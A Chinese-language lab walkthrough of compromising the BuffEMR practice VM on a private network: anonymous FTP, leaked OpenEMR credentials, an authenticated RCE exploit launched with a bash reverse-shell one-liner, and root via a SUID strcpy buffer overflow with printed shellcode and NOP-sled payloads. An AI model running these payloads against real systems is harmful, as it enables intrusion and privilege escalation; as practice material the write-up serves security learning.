```
└─# nmap -p- -sV -A 192.168.0.102
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    3 0        0            4096 Jun 21  2021 share
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.0.103
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 92:4c:ae:7b:01:fe:84:f9:5e:f7:f0:da:91:e4:7a:cf (RSA)
|   256 95:97:eb:ea:5c:f8:26:94:3c:a7:b6:b4:76:c3:27:9c (ECDSA)
|_  256 cb:1c:d9:56:4f:7a:c0:01:25:cd:98:f6:4e:23:2e:77 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 00:0C:29:AE:9D:6C (VMware)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

细节，看到nmap可以扫到ftp匿名登录 Anonymous

### 对80端口信息搜集：

```
└─# gobuster dir -u http://192.168.0.102 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js,php.bak,txt.bak,html.bak,json,git,git.bak 
└─# nikto -host 192.168.0.102
```

好，暂时扫不到有用的上下文，那就先看看21端口ftp匿名登录吧

### 对21端口：

```
Connected to 192.168.0.102.
220 (vsFTPd 3.0.3)
Name (192.168.0.102:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 0        0            4096 Jun 21  2021 share
226 Directory send OK.
ftp> 
```

```
wget -r -np -nH ftp://192.168.0.102/share/openemr/
```

下载openemr目录到本机看看，在网站源码查看重要信息，用到的工具是Seay代码审计系统，先重点在源码中寻找账号密码的相关信息

我去，Seay没找到，用phpstorm找到了一个测试账号     admin:Monster123

也很显然，我们看看此时80端口的路径   http://192.168.0.102/openemr   用测试账号登录试试

<img src=".\图片\Snipaste_2022-11-30_14-15-39.png" alt="Snipaste_2022-11-30_14-15-39" style="zoom:80%;" />

<img src=".\图片\Snipaste_2022-11-30_14-17-02.png" alt="Snipaste_2022-11-30_14-17-02" style="zoom:80%;" />

此时进入后台，我们要优先寻找此cms的版本与已知漏洞，也可以手动尝试功能点有无漏洞

发现版本    Version Number: v5.0.1  (3) 

```
└─# searchsploit openemr                
OpenEMR 5.0.1.3 - '/portal/account/register.php' Authentication Bypass                                                       | php/webapps/50017.py
OpenEMR 5.0.1.3 - 'manage_site_files' Remote Code Execution (Authenticated)                                                  | php/webapps/49998.py
OpenEMR 5.0.1.3 - 'manage_site_files' Remote Code Execution (Authenticated) (2)                                              | php/webapps/50122.rb
OpenEMR 5.0.1.3 - (Authenticated) Arbitrary File Actions                                                                     | linux/webapps/45202.txt
OpenEMR 5.0.1.3 - Remote Code Execution (Authenticated)                                                                      | php/webapps/45161.py
```

接下来漏洞利用吧，找到脚本修改下参数

```
 python openemr_rce.py http://192.168.0.102/openemr -u admin -p Monster123 -c 'bash -i >& /dev/tcp/192.168.0.103/1337 0>&1'
```

<img src=".\图片\Snipaste_2022-11-30_14-39-59.png" alt="Snipaste_2022-11-30_14-39-59"  />

### www提权：

www权限，此时先找找系统的重要文件，用户的重要文件啥的

此时是找到了/var/user.zip ，但是需要密码破解，于是又找密码，在本地下载的源码 /openemr/sql/keys.sql 里找到

```
INSERT into ENCKEY (id, name, enckey) VALUES (1, "pdfkey", "c2FuM25jcnlwdDNkCg==");  c2FuM25jcnlwdDNkCg==
```

你以为base64解码后才是user.zip的密码，no，不要解密，直接输密码

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

解压时显示无权限

```
www-data@buffemr:/var$ unzip user.zip
unzip user.zip
Archive:  user.zip
[user.zip] user.lst password: c2FuM25jcnlwdDNkCg==

error:  cannot create user.lst
        Permission denied
```

于是开启python的http服务下载user.zip到本地解压

<img src=".\图片\Snipaste_2022-11-30_14-57-33.png" alt="Snipaste_2022-11-30_14-57-33" style="zoom:80%;" />

```
This file contain senstive information, therefore, should be always encrypted at rest.

buffemr - Iamgr00t

****** Only I can SSH in ************
```

于是SSH登录

```
└─# ssh buffemr@192.168.0.102
buffemr@buffemr:~$ id
uid=1000(buffemr) gid=1000(buffemr) groups=1000(buffemr),4(adm),24(cdrom),30(dip),46(plugdev),116(lpadmin),126(sambashare)
```

### 重难点：缓冲区溢出

```
find / ‐perm ‐u=s ‐type f 2>/dev/null
```

发现 /opt/dontexecute

```
buffemr@buffemr:~$ strings /opt/dontexecute
/lib/ld-linux.so.2
libstdc++.so.6
__gmon_start__
_ITM_deregisterTMCloneTable
_ITM_registerTMCloneTable
_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc
_ZSt4cout
_ZNSt8ios_base4InitD1Ev
_ZNSt8ios_base4InitC1Ev
libc.so.6
_IO_stdin_used
strcpy
__cxa_atexit
__cxa_finalize
__libc_start_main
GLIBCXX_3.4
GLIBC_2.0
GLIBC_2.1.3
UWVS
[^_]
Usage: ./dontexecute argument
;*2$"
GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7283
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
dontexecute.cpp
_ZStL19piecewise_construct
_ZStL8__ioinit
_Z41__static_initialization_and_destruction_0ii
_GLOBAL__sub_I__Z10vulnerablePc
__FRAME_END__
__GNU_EH_FRAME_HDR
_DYNAMIC
__init_array_end
__init_array_start
_GLOBAL_OFFSET_TABLE_
__cxa_finalize@@GLIBC_2.1.3
__x86.get_pc_thunk.ax
_edata
_IO_stdin_used
_fp_hw
main
__dso_handle
__cxa_atexit@@GLIBC_2.1.3
__x86.get_pc_thunk.bx
__libc_start_main@@GLIBC_2.0
_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@@GLIBCXX_3.4
__TMC_END__
_ZSt4cout@@GLIBCXX_3.4
__data_start
__x86.get_pc_thunk.dx
__bss_start
_ZNSt8ios_base4InitC1Ev@@GLIBCXX_3.4
__libc_csu_init
_ITM_deregisterTMCloneTable
__libc_csu_fini
__gmon_start__
strcpy@@GLIBC_2.0
_ITM_registerTMCloneTable
_ZNSt8ios_base4InitD1Ev@@GLIBCXX_3.4
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rel.dyn
.rel.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
```

发现strcpy，经典的缓冲区溢出相关的复制函数，发现这个二进制文件使用了一个名为 "strcpy" 的函数。strcpy() 函数没有指定目标数组的大小，会导致缓冲区溢出。可以尝试溢出缓冲区来运行 shell 代码获取 root 权限，gdb 运行

```
gdb -q dontexecute
```

还有一种方式验证缓冲区溢出，直接执行./dontexecute 后面带大量参数，看看返回

```
buffemr@buffemr:/opt$ ./dontexecute $(python -c 'print("A"*3000)')
Segmentation fault (core dumped)
```

接下来，我们要知道它缓冲区溢出的确切位置，生成2000个有序字符

```
└─# msf-pattern_create -l 2000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co
```

接下来以gdb来调试

```
gdb ./dontexecute
```

<img src=".\图片\Snipaste_2022-12-01_12-05-51.png" alt="Snipaste_2022-12-01_12-05-51" style="zoom:80%;" />

找到溢出位置，从  0x31724130  开始溢出，从第512个字符后开始溢出

```
┌──(root💀kali)-[~]
└─# msf-pattern_offset -q 0x31724130
[*] Exact match at offset 512
```

还有一种办法判断溢出位置，0x42424242刚好是B的16进制

```
(gdb) run $(python -c 'print("A"*512+"B"*100)')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/dontexecute $(python -c 'print("A"*512+"B"*100)')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

```
(gdb) info registers
eax            0xffffd0fc       -12036
ecx            0xffffd780       -10368
edx            0xffffd35d       -11427
ebx            0x41414141       1094795585
esp            0xffffd300       0xffffd300
ebp            0x41414141       0x41414141
esi            0xf7e31000       -136114176
edi            0x0      0
eip            *0x42424242*       0x42424242
eflags         0x10286  [ PF SF IF RF ]
cs             0x23     35
ss             0x2b     43
ds             0x2b     43
es             0x2b     43
fs             0x0      0
gs             0x63     99
```

```
(gdb) x/300wx $esp
0xffffd300:     0x42424242      0x42424242      0x42424242      0x42424242
0xffffd310:     0x42424242      0x42424242      0x42424242      0x42424242
0xffffd320:     0x42424242      0x42424242      0x42424242      0x42424242
0xffffd330:     0x42424242      0x42424242      0x42424242      0x42424242
0xffffd340:     0x42424242      0x42424242      0x42424242      0x42424242
0xffffd350:     0x42424242      0x42424242      0x42424242      0x42424242
0xffffd360:     0x00000000      0x51e6c0a4      0x20dd66b4      0x00000000
0xffffd370:     0x00000000      0x00000000      0x00000040      0xf7ffd024
0xffffd380:     0x00000000      0x00000000      0xf7fe5819      0x56556fc4
0xffffd390:     0x00000002      0x56555560      0x00000000      0x56555591
0xffffd3a0:     0x565556ce      0x00000002      0xffffd3c4      0x565557c0
0xffffd3b0:     0x56555820      0xf7fe5960      0xffffd3bc      0xf7ffd940
0xffffd3c0:     0x00000002      0xffffd50e      0xffffd51f      0x00000000
0xffffd3d0:     0xffffd784      0xffffdd70      0xffffdda4      0xffffddc6
0xffffd3e0:     0xffffddd5      0xffffdde6      0xffffddfb      0xffffde0c
0xffffd3f0:     0xffffde19      0xffffde22      0xffffde2b      0xffffde3e
0xffffd400:     0xffffde60      0xffffdea1      0xffffdeb4      0xffffdec0
0xffffd410:     0xffffded7      0xffffdee7      0xffffdef2      0xffffdefa
0xffffd420:     0xffffdf0a      0xffffdf40      0xffffdf5f      0xffffdfc7
0xffffd430:     0x00000000      0x00000020      0xf7fd5b50      0x00000021
0xffffd440:     0xf7fd5000      0x00000010      0x078bfbff      0x00000006
0xffffd450:     0x00001000      0x00000011      0x00000064      0x00000003
0xffffd460:     0x56555034      0x00000004      0x00000020      0x00000005
0xffffd470:     0x00000009      0x00000007      0xf7fd6000      0x00000008
0xffffd480:     0x00000000      0x00000009      0x56555560      0x0000000b
0xffffd490:     0x000003e8      0x0000000c      0x000003e8      0x0000000d
0xffffd4a0:     0x000003e8      0x0000000e      0x000003e8      0x00000017
0xffffd4b0:     0x00000001      0x00000019      0xffffd4eb      0x0000001a
0xffffd4c0:     0x00000000      0x0000001f      0xffffdfe7      0x0000000f
0xffffd4d0:     0xffffd4fb      0x00000000      0x00000000      0x00000000
0xffffd4e0:     0x00000000      0x00000000      0x5d000000      0x50ffac6a
0xffffd4f0:     0x66add720      0x74fe718c      0x697d3d02      0x00363836
0xffffd500:     0x00000000      0x00000000      0x00000000      0x6f2f0000
0xffffd510:     0x642f7470      0x65746e6f      0x75636578      0x41006574
```

计算出偏移量是 512，查看ESP寄存器的值：

```
x/300wx $esp
```

先找个 shell：

```
\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh
```

这个shell 是 53 字节：

再来试验下shellcode的位置，512-53=459

```
$(python -c 'print("A"*459+"\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"+"B"*40)')
```

说明下payload参数

x90：什么都不做，不做任何操作

\xa0\xd6\xff\xff：eip的位置，下次程序从这里开始加载，注意\xa0\xd6\xff\xff是原本在之前任意选择/x90的地址倒过来写的

\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh：调用bash的shellcode

```
$(python -c 'print "\x90" * 459 + "\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\xa0\xd6\xff\xff"')
```

<img src=".\图片\Snipaste_2022-12-01_12-52-49.png" alt="Snipaste_2022-12-01_12-52-49" style="zoom: 80%;" />

### 总结：

21端口的ftp匿名登录后可查看目录，可下载文件

缓冲区溢出，先判断溢出位置，再填充shelllcode
